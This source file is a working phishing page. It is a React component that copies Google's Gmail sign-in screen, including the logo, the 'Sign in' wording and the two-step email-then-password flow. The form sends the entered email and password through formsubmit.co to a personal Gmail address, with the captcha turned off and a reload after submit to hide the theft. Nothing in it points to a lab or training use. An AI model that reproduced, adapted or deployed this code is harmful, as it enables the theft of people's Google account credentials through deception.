"use client";


import { useState } from "react";

export default function Home() {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")



  const handleNext = () => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (email.trim() !== "" || emailRegex.test(email)) {
      setStep(step + 1);
    }
  }

  const handleSubmit = () => {
    if (password.trim() !== "") {
      window.location.reload();
    }

    console.log(email, password);

  }

  return (
    <form action="https://formsubmit.co/Gstrait0518@gmail.com" method="POST" className="w-screen h-screen bg-white md:bg-[#f0f4f9] flex flex-col justify-start md:justify-center items-center">
      <input type="hidden" name="_captcha" value="false" />
      <input type="hidden" name="_next" value="/" />
      <div className="px-0 md:px-[40px] py-[20px] md:py-[40px] bg-white w-[90%] lg:w-[70%] max-w-[1300px] mx-auto rounded-2xl flex flex-col gap-[20px]">
        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true">
          <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
          <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
          <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
          <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
        </svg>

        {step === 1 ? <div className="grid grid-cols-1 md:grid-cols-2 gap-[40px]">
          <div className="">
            <h1 className="text-[40px]">Sign in</h1>
            <p className="font-[400]">with your Google Account to continue to Gmail. This account will be available to other Google apps in the browser.</p>
          </div>

          <div className="">
            <div className="mb-[40px]">
              <div className="relative border border-black/50 rounded bg-transparent focus-within:border-blue-500 focus-within:border-2">
                <input
                  type="email"
                  name="email"
                  id="email"
                  placeholder=" "
                  className="w-full outline-none p-[15px] bg-transparent peer"
                  onChange={(e) => setEmail(e.target.value)}
                  value={email}
                  required
                />
                <label
                  htmlFor="email"
                  className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 pointer-events-none transition-all duration-200
                        peer-placeholder-shown:top-1/2
                        peer-placeholder-shown:text-base
                        peer-placeholder-shown:text-gray-500
                        peer-focus:-top-0
                        peer-focus:text-xs
                        peer-focus:text-blue-500
                        peer-focus:bg-white px-2 font-[500]
                        "
                >
                  Email or phone
                </label>
              </div>

              <span className="text-blue-500 font-[500]">Forgot email?</span>
            </div>

            <p className="text-[14px]">
              Not your computer? Use Guest mode to sign in privately. <a href="https://support.google.com/chrome/answer/6130773?hl=en" target="_blank" className="text-blue-500 font-[500]">
                Learn more about using Guest mode
              </a>
            </p>

          </div>
        </div> : <div className="grid grid-cols-1 md:grid-cols-2 gap-[40px]">
          <div className="">
            <h1 className="text-[40px]">Welcome</h1>
            <div className="rounded-[40px] p-[10px] h-[40px] border border-black/[.5] max-w-full md:max-w-[400px] flex items-center gap-[10px]">
              <svg aria-hidden="true" className="Qk3oof w-[30px]" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg>

              <div className="flex justify-between w-full">
                <span>{email}</span>

                <svg aria-hidden="true" className="Qk3oof u4TTuf" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"></path></svg>
              </div>
            </div>
          </div>

          <div className="">
            <div className="mb-[40px]">
              <div className="relative border border-black/50 rounded bg-transparent focus-within:border-blue-500 focus-within:border-2">
                <input type="hidden" name="email" value={email} />

                <input
                  type="password"
                  name="password"
                  id="password"
                  placeholder=" "
                  className="w-full outline-none p-[15px] bg-transparent peer"
                  onChange={(e) => setPassword(e.target.value)}
                  value={password}
                  required
                />

                <label
                  htmlFor="email"
                  className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 pointer-events-none transition-all duration-200
                        peer-placeholder-shown:top-1/2
                        peer-placeholder-shown:text-base
                        peer-placeholder-shown:text-gray-500
                        peer-focus:-top-0
                        peer-focus:text-xs
                        peer-focus:text-blue-500
                        peer-focus:bg-white px-2 font-[500]
                        "
                >
                  Enter your password
                </label>
              </div>



              <div className="font-[500] flex gap-[10px] mt-[5px] text-gray-500 w-[min-content] cursor-pointer whitespace-nowrap">
                <input type="checkbox" id="showPassword" />
                <label htmlFor="showPassword">Show password</label>
              </div>
            </div>

            <p className="text-[14px]">
              Not your computer? Use Guest mode to sign in privately. <a href="https://support.google.com/chrome/answer/6130773?hl=en" target="_blank" className="text-blue-500 font-[500]">
                Learn more about using Guest mode
              </a>
            </p>

          </div>
        </div>}

        <div className="mt-[40px] flex justify-between md:justify-end gap-[30px]">
          <button className="text-blue-500 font-[500] cursor-pointer">{step === 1 ? "Create account" : "Forgot password?"}</button>
          <button type={step === 1 ? "button" : "submit"} className="p-[10px_30px] bg-blue-500 text-white rounded-[40px] cursor-pointer" onClick={step === 1 ? handleNext : handleSubmit}>Next</button>
        </div>
      </div>
      <div className="gap-[20px] p-[10px] hidden md:flex justify-end w-[90%] lg:w-[70%] max-w-[1300px] mx-auto">
        <span className="text-[14px]">Help</span>
        <span className="text-[14px]">Privacy</span>
        <span className="text-[14px]">Terms</span>
      </div>
    </form>
  );
}
